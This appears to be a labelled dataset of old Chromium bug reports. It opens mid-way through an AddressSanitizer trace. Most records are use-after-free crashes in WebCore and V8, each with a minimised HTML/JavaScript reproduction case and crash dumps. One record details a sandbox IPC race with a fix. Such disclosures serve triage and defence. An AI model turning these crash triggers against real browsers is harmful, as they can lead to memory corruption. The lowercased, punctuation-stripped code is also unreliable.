media/chromium/chromium/depot_tools/src/v8/src/ic.cc:1391 11 in v8 internal storeic_miss v8 internal arguments v8 internal isolate media/chromium/chromium/depot_tools/src/v8/src/ic.cc:2011 12 13 14 15 16 17 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 18 in v8 function call v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/v8/src/api.cc:3608 19 in webcore v8proxy instrumentedcallfunction webcore frame v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:437 20 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:407 21 in webcore v8lazyeventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8lazyeventlistener.cpp:98 22 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:160 23 in scope media/chromium/chromium/depot_tools/src/v8/include/v8.h:3577 24 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:231 25 in webcore event defaultprevented const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/event.h:133 26 in webcore node handlelocalevents webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2755 27 in wtf passrefptr webcore event operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:76 28 in webcore eventdispatchmediator dispatchevent webcore eventdispatcher const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatchmediator.cpp:51 29 in webcore eventdispatcher dispatchevent webcore node wtf passrefptr webcore eventdispatchmediator media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:55 30 in webcore node dispatchevent wtf passrefptr webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2769 31 in webcore domwindow dispatchloadevent media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/domwindow.cpp:1548 32 in webcore document dispatchwindowloadevent media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:3734 33 in webcore frameloader checkcompleted media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:799 34 in webcore frameloader finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:680 35 in webcore frame page const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frame.h:353 36 in webcore documentwriter endifnotloadingmainresource media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentwriter.cpp:249 37 in webcore resourceerrorbase isnull const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/network/resourceerrorbase.h:42 38 in webcore mainresourceloader didfinishloading double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:485 39 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/webkit/glue/weburlloader_impl.cc:662 40 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:489 41 in void dispatchtomethod resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const int net urlrequeststatus std basic_string char std char_traits char std allocator char base timeticks resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const tuple4 int net urlrequeststatus std basic_string char std char_traits char std allocator char base timeticks const media/chromium/chromium/depot_tools/src/./base/tuple.h:566 42 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:559 43 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 85650897 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 57267916 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 85650897 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 57267916 bfd dwarf error offset 1949266029 greater than or equal to debug_str size 85650897 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 57267916 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 85650897 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 57267916 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 85650897 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 57267916 44 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:172 45 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:268 46 in base callback void run const media/chromium/chromium/depot_tools/src/./base/callback.h:272 47 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 48 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 49 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 50 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 51 in autorunstate media/chromium/chromium/depot_tools/src/base/message_loop.cc:745 52 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 53 in runzygote media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:245 54 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:35 55 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 56 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 57 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 is located 0 bytes inside of 520-byte region freed by thread t0 here 0 in operator delete void 0 1 in webcore treeshared webcore containernode deref media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/treeshared.h:79 2 in webcore range surroundcontents wtf passrefptr webcore node int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/range.cpp:1559 3 in webcore rangeinternal surroundcontentscallback v8 arguments const media/chromium/chromium/depot_tools/src/out/release/obj/gen/webcore/bindings/v8range.cpp:372 4 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1136 5 6 7 8 9 10 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 11 in v8 function call v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/v8/src/api.cc:3608 12 in webcore v8proxy instrumentedcallfunction webcore frame v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:437 13 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:407 14 in webcore v8lazyeventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8lazyeventlistener.cpp:98 15 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:160 16 in scope media/chromium/chromium/depot_tools/src/v8/include/v8.h:3577 17 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:231 18 in webcore event defaultprevented const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/event.h:133 19 in webcore node handlelocalevents webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2755 20 in wtf passrefptr webcore event operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:76 21 in webcore eventdispatchmediator dispatchevent webcore eventdispatcher const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatchmediator.cpp:51 22 in webcore eventdispatcher dispatchevent webcore node wtf passrefptr webcore eventdispatchmediator media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:55 23 in webcore node dispatchevent wtf passrefptr webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2769 24 in webcore domwindow dispatchloadevent media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/domwindow.cpp:1548 25 in webcore document dispatchwindowloadevent media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:3734 26 in webcore frameloader checkcompleted media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:799 27 in webcore frameloader finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:680 28 in webcore frame page const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frame.h:353 29 in webcore documentwriter endifnotloadingmainresource media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentwriter.cpp:249 previously allocated by thread t0 here 0 in operator new unsigned long 0 1 in webcore svgtrefelement create webcore qualifiedname const webcore document media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgtrefelement.cpp:61 2 in wtf passrefptr webcore svgtrefelement leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 3 in wtf passrefptr webcore svgelement operator webcore svgelement wtf passrefptr webcore svgelement const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:82 4 in wtf passrefptr webcore svgelement leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 5 in wtf passrefptr webcore element leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 6 in wtf passrefptr webcore node leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 7 in wtf passrefptr webcore node leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 8 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1136 9 10 11 12 13 14 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 15 in v8 function call v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/v8/src/api.cc:3608 16 in webcore v8proxy instrumentedcallfunction webcore frame v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:437 17 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:407 18 in webcore v8lazyeventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8lazyeventlistener.cpp:98 19 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:160 20 in scope media/chromium/chromium/depot_tools/src/v8/include/v8.h:3577 21 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:231 22 in webcore event defaultprevented const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/event.h:133 3489 aborting stats 41m malloced 37m for red zones by 73344 calls stats 1m realloced by 1743 calls stats 37m freed by 57647 calls stats 0m really freed by 0 calls stats 104m 26641 full pages mmaped in 26 calls mmaps by size class 8:65532 9:16382 10:8190 11:2047 12:1024 13:1536 14:256 15:256 16:64 17:64 18:16 19:8 22:5 mallocs by size class 8:57656 9:8033 10:4430 11:1212 12:336 13:1194 14:138 15:249 16:27 17:49 18:8 19:7 22:5 frees by size class 8:43288 9:7433 10:4108 11:958 12:254 13:1169 14:121 15:242 16:20 17:34 18:8 19:7 22:5 rfrees by size class stats malloc large 69 small slow 391 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
heap-use-after-free in webcore genericeventqueue genericeventqueue crashes on windows dev 19.0.1068.1 126852 and canary 19.0.1075.0 127639 ca n't reproduce on stable crash1.html doctype html script function reloading window.open crash1.html self settimeout reloading 200 window.onload main function main window.document.body.innerhtml foo script audio tag is not necessary but increases the probability of catching this audio src water.mp3 audio video autoplay src bear.mp4 video 1d74.1dc8 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled eax=0293b930 ebx=00f55580 ecx=0293b540 edx=0293b7e0 esi=00000000 edi=00000000 eip=0293b7e0 esp=001feca8 ebp=001fecd4 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202 0293b7e0 20b6930230b9 and byte ptr esi-46cffd6dh dh ds:0023 b9300293 exceptionaddress 0293b7e0 exceptioncode c0000005 access violation exceptionflags 00000000 numberparameters 2 parameter 0 00000008 parameter 1 0293b7e0 attempt to execute non-executable address 0293b7e0 childebp retaddr warning frame ip not in any known module following frames may be wrong 001feca4 5f975f2c 001fecd4 5f975cd5 chrome_5ef50000 webcore htmlmediaelement htmlmediaelement 001fece0 5f2e0b92 chrome_5ef50000 webcore htmlmediaelement scalar deleting destructor 001fece8 5f04edce chrome_5ef50000 v8 string externalstringresourcebase dispose 001fecf0 5f04ed43 chrome_5ef50000 webcore event event 001fecfc 5f90a57a chrome_5ef50000 webcore event scalar deleting destructor 001fed08 5fa05b1d chrome_5ef50000 wtf vectordestructor 1 wtf refptr webcore layerchromium destruct 001fed18 5f975f61 chrome_5ef50000 webcore genericeventqueue genericeventqueue 001fed44 5f99fde2 chrome_5ef50000 webcore htmlmediaelement htmlmediaelement 001fed50 5f2e0b92 chrome_5ef50000 webcore htmlvideoelement scalar deleting destructor 001fed58 5f04edce chrome_5ef50000 v8 string externalstringresourcebase dispose 001fed60 5f04ed43 chrome_5ef50000 webcore event event 001fed6c 5f90a57a chrome_5ef50000 webcore event scalar deleting destructor 001fed78 5fa05df7 chrome_5ef50000 wtf vectordestructor 1 wtf refptr webcore layerchromium destruct 001fedf8 5f978c3f chrome_5ef50000 webcore genericeventqueue cancelallevents 001fee78 5f97c938 chrome_5ef50000 webcore htmlmediaelement cancelpendingeventsandcallbacks 001feef8 5f129566 chrome_5ef50000 webcore htmlmediaelement stop 001fef20 5f12928d chrome_5ef50000 webcore scriptexecutioncontext stopactivedomobjects 001fef38 5f03c877 chrome_5ef50000 webcore document detach 001fef9c 5f03c625 chrome_5ef50000 webcore frame setview 001fefb8 5f03c27a chrome_5ef50000 webcore frame createview 001ff020 5f03b946 chrome_5ef50000 webkit webframeimpl createframeview 001ff038 5f03ad36 chrome_5ef50000 webcore frameloader transitiontocommitted 001ff19c 5f1210a6 chrome_5ef50000 webcore frameloader commitprovisionalload 001ff1b4 5f121065 chrome_5ef50000 webcore documentloader commitload 001ff1c8 5f120e3a chrome_5ef50000 webcore documentloader receiveddata	11
heap-use-after-free in webcore applystylecommand applyinlinestyletonoderange vulnerability details use-after-free in webcore applystylecommand applyinlinestyletonoderange version chrome version stable beta dev chromium 19.0.1078.0 developer build 128192 os linux webkit 536.4 111590 operating system 64bit linux reproduction case html head script onload function x.innerhtml settimeout function document.designmode='on document.execcommand selectall document.execcommand bold 0 script head body div id x iframe src data iframe div input input div ul body html for crashes please include the following additional information type of crash renderer asan crash state 3487 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore applystylecommand applyinlinestyletonoderange webcore editingstyle webcore node webcore node 0 1 in webcore applystylecommand fixrangeandapplyinlinestyle webcore editingstyle webcore position const is located 64 bytes inside of 104-byte region freed by thread t0 here 0 in operator delete void 0 1 in webcore applystylecommand applyinlinestyletonoderange webcore editingstyle webcore node webcore node 0 2 in webcore applystylecommand fixrangeandapplyinlinestyle webcore editingstyle webcore position const webcore position const 0	11
heap-use-after-free in webcore containernode resumepostattachcallbacks vulnerability details use-after-free with input that overwrites document element contents during focus version chrome version stable beta dev chromium 19.0.1081.0 developer build 128813 os linux webkit 536.4 111994 operating system 64 bit linux reproduction case html body object data a input autofocus onfocus document.documentelement.textcontent a object body html for crashes please include the following additional information type of crash renderer asan crash state 22166 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore containernode resumepostattachcallbacks 0 1 in webcore element attach 0 2 in webcore frameloader receivedmainresourceerror webcore resourceerror const bool 0 is located 40 bytes inside of 224-byte region freed by thread t0 here 0 in operator delete void 0 1 in wtf vector std pair void webcore node unsigned int std pair wtf refptr webcore node unsigned int 0ul shrinkcapacity unsigned long 0 2 in webcore containernode resumepostattachcallbacks 0	11
heap-use-after-free in webcore v8recursionscope didleavescriptcontext detailed report fuzzer inferno_layout_test_fuzzer crash type heap-use-after-free read 8 crash address crash state crash stack webcore v8recursionscope didleavescriptcontext webcore v8proxy instrumentedcallfunction free stack webcore scriptcontroller executeifjavascripturl webcore subframeloader requestframe regressed minimized testcase 0.68 kb	11
heap-use-after-free in webcore renderblock checkfloatsincleanline detailed report fuzzer marty_html_twiddler crash type heap-use-after-free read 8 crash address crash state crash stack webcore renderboxmodelobject hasselfpaintinglayer webcore renderblock addoverhangingfloats free stack webcore node detach webcore element detach regressed minimized testcase 2.76 kb	11
security ipc channel does not validate the listener vulnerability details the ipc channel does not validate the identity of the listener process it makes it possible for another process to connect to a pipe started by the browser process if the fake listener process is unprivileged and connect to a pipe with more rights it will cause a privilege escalation version chrome version all operating system windows	9
sandbox ipc length checking race this is from willem pinckaers of matasano it does n't look practically exploitable in chrome because our policy is too narrow to let the vulnerable pattens through however it could be a browser crash so marking as low severity for now i ll add another comment with a more detailed explanation shortly hi all below the details of a bug in the sandboxing ipc mechanism that is shared with google chrome the issue is verified in a debugger upto changing param_count in the returned object see description below possible exploitation path and impact analysis is based on reading of the source code the bug can be exploited to allow for memory read and write inside the broker process and as such can be exploited to gain code execution inside the broker process leading to a complete compromise of broker process and the users machine it was not checked if the bug has the same impact on chrome but it is likely issue quick description sharedmemipcserver invokecallback calls crosscallparamsex createfrombuffer buffer_base points to the shared memory call_params crosscallparams buffer_base param_count call_params getparamscount copied_params crosscallparamsex backing_mem memcpy backing_mem call_params size verifications based on param_count between the getparamscount read of param_count and the memcpy the contents of the memory could have been changed by an attacker as a result copied_params getparamscount and param_count might not match all further verification in createfrombuffer is done using the old param_count while further accesses use the new getparamscount the accessors trust that the parameters up to the new getparamscount have been checked however due to the attacker changing the shared memory this trust is misplaced return from createfrombuffer calls getargs getargs will collect the parameters based on a changed getparamscount giving an attacker full control over a type size and offset of a parameter using a debugger we verified that getargs will indeed parse the extranous non checked parameter and accept//return attacker controlled type/size and offset solution the easiest resolution that i see if to check if copied_params getparamscount param_count just after the memcpy in createfrombuffer in theory someone can mess with the getactualbuffersize call as well but all those values are checked in the loop at the end of createfrombuffer example patch below not tested not even compiled regards willem pinckaers crosscall_server.56938.cc 2012-03-27 14:13:44.000000000 0700 crosscall_server.fixed.cc 2012-03-27 14:27:15.000000000 0700 138,6 138,12 copied_params reinterpret_cast crosscallparamsex backing_mem memcpy backing_mem call_params declared_size and verify that no-one changed param_count in the shared memory if copied_params getparamscount param_count delete backing_mem return null except exception_execute_handler in case of a windows exception we know it occurred while touching the untrusted buffer so we bail out as is	11
security use-after-free in webcore renderboxmodelobject hasselfpaintinglayer vulnerability details use-after-free in webcore renderboxmodelobject hasselfpaintinglayer version chrome version dev chromium 20.0.1092.0 developer build 130586 os linux webkit 536.6 113153 operating system 64bit linux reproduction case html head style el0 float left el1 padding-top 1em padding-bottom 1em margin-bottom 1em display table webkit-margin-before 100px style script onload function document.body.appendchild document.createelement select el0=document.createelement hr el0.setattribute id el0 document.body.appendchild el0 el1=document.createelement div el1.setattribute id el1 document.body.appendchild el1 el1.appendchild document.createelement textarea el2=document.createelement div document.body.appendchild el2 el2.appendchild document.createelement input document.body.offsettop document.body.removechild el0 script head body body html for crashes please include the following additional information type of crash tab asan crash state 28339 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore renderboxmodelobject hasselfpaintinglayer const 0 1 in webcore renderblock addoverhangingfloats webcore renderblock bool 0 is located 56 bytes inside of 184-byte region freed by thread t0 here 0 in free 0 1 in webcore node detach 0 2 in webcore element detach 0	11
browser crash with ftp video source chrome version 17.0.963.46 official build 119351 beta os version linux debian 6.0.4 x86_64 urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 firefox 4.x ok ie 7/8/9 what steps will reproduce the problem 1 echo video src=ftp 1 ftp.html 2 3 google-chrome ftp.html what is the expected result chrome does n't crash what happens instead chrome io thread crashes taking the rest of the browser with it please provide any additional information below attach a screenshot if possible this looks like a plain null deref so not reporting as a security bug	11
links in settings page like learn more google dashboard are opened in the webui renderer process what steps will reproduce the problem 1 bring up settings in chrome go to the sync section 2 click on the google dashboard link this opens the dashboard in a separate window 3 switch back to the settings page try to click on stuff what is the expected output what do you see instead expected that i should be able to interact with the settings page actual i ca n't looks like the google dashboard usurps the renderer process i m not sure what it s doing maybe a synchronous xhr i see the cpu go to 100 on that page for several seconds so maybe it s just busy-waiting on something jochen what s the google dashboard doing to block the renderer is this avoidable this is really bad for other pages that get plopped in the same renderer process jhawkins i believe it s dangerous for us to open random web pages even trusted origins like www.google.com inside the webui process because that renderer has special permissions can we open these pages in a separate process maybe using the window.open opener=null trick please use labels and text to provide additional information	2
long autofilled value causes render issue chrome version 17.0.963.79 m os version 6.1 windows 7 windows server 2008 r2 urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 firefox 4.x ie 7/8/9 what steps will reproduce the problem 1 enter a very long string into autofillable form field and submit form 2 repeat process and choose very long value from drop down 3 you may need to focus on new field or effect may become immediately visible see attached image what is the expected result drop down with value truncated form field filled with value autofill drop down disappears what happens instead drop down stretches across page when selected dropdown moves to below the address bar followed by a badly rendered portion of the page please provide any additional information below attach a screenshot if possible	11
heap-use-after-free in v8 internal jsobject getelementwithinterceptor vulnerability details usea-after-free in javascript engine version version 19.0.1068.0 126348 developer build on ubuntu 10.10 reproduction case unfortunately ca n't provide testcase currently this is one of those rare cases when reproduction does not works decided to provide at least stack trace probably it can be useful this bug appears quite frequently so probably later i will get finally the testcase for crashes please include the following additional information 5320 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore tov8 webcore cssstylesheet 0 1 in v8 internal jsobject getelementwithinterceptor v8 internal object unsigned int media/chromium/chromium/depot_tools/src/v8/src/objects.cc:10097 2 in v8 internal runtime getobjectproperty v8 internal isolate v8 internal handle v8 internal object v8 internal handle v8 internal object media/chromium/chromium/depot_tools/src/v8/src/runtime.cc:4182 3 in v8 internal keyedloadic load v8 internal inlinecachestate v8 internal handle v8 internal object v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/ic.cc:1195 4 in v8 internal keyedloadic_miss v8 internal arguments v8 internal isolate media/chromium/chromium/depot_tools/src/v8/src/ic.cc:1987 5 6 7 8 9 10 11 12 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 13 in v8 script run media/chromium/chromium/depot_tools/src/v8/src/api.cc:1588 14 in webcore v8proxy runscript v8 handle v8 script media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:382 15 in webcore v8proxy evaluate webcore scriptsourcecode const webcore node media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:353 16 in scope media/chromium/chromium/depot_tools/src/v8/include/v8.h:3577 17 in webcore inspectorinstrumentation hasfrontends media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/inspector/inspectorinstrumentation.h:225 18 in webcore threadtimers sharedtimerfiredinternal media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 19 in base callback void run const media/chromium/chromium/depot_tools/src/./base/callback.h:272 20 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 21 in messageloop dodelayedwork base timeticks media/chromium/chromium/depot_tools/src/base/message_loop.cc:698 22 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:33 23 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 24 in autorunstate media/chromium/chromium/depot_tools/src/base/message_loop.cc:745 25 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 26 in runzygote media/chromium/chromium/depot_tools/src/content/app/content_main_runner.cc:245 27 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:35 28 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 29 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 30 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 is located 8 bytes inside of 136-byte region freed by thread t0 here 0 in operator delete void 0 1 in v8 internal runtimeprofiler isenabled media/chromium/chromium/depot_tools/src/v8/src/runtime-profiler.h:50 previously allocated by thread t0 here 0 in operator new unsigned long 0 1 in webcore htmlstyleelement create webcore qualifiedname const webcore document bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/html/htmlstyleelement.cpp:70 2 in wtf passrefptr webcore htmlstyleelement leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 3 in wtf passrefptr webcore htmlelement operator webcore htmlelement wtf passrefptr webcore htmlelement const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:82 4 in wtf passrefptr webcore htmlelement leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 5 in wtf passrefptr webcore element leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 6 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1136 7 8 9 10 11 12 13 14 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 15 in v8 script run media/chromium/chromium/depot_tools/src/v8/src/api.cc:1588 16 in webcore v8proxy runscript v8 handle v8 script media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:382 17 in webcore v8proxy evaluate webcore scriptsourcecode const webcore node media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:353 18 in scope media/chromium/chromium/depot_tools/src/v8/include/v8.h:3577 19 in webcore inspectorinstrumentation hasfrontends media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/inspector/inspectorinstrumentation.h:225 20 in webcore threadtimers sharedtimerfiredinternal media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/threadtimers.cpp:118 5320 aborting stats 109m malloced 128m for red zones by 331569 calls stats 19m realloced by 16069 calls stats 103m freed by 306260 calls stats 0m really freed by 0 calls stats 260m 66588 full pages mmaped in 65 calls mmaps by size class 8:262128 9:40955 10:28665 11:18423 12:3072 13:1024 14:512 15:128 16:64 17:160 18:96 19:32 20:16 mallocs by size class 8:248081 9:37212 10:25489 11:16687 12:2322 13:911 14:418 15:100 16:64 17:143 18:95 19:32 20:15 frees by size class 8:225725 9:35875 10:24598 11:16216 12:2223 13:830 14:382 15:87 16:52 17:135 18:93 19:31 20:13 rfrees by size class stats malloc large 285 small slow 1343 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa	11
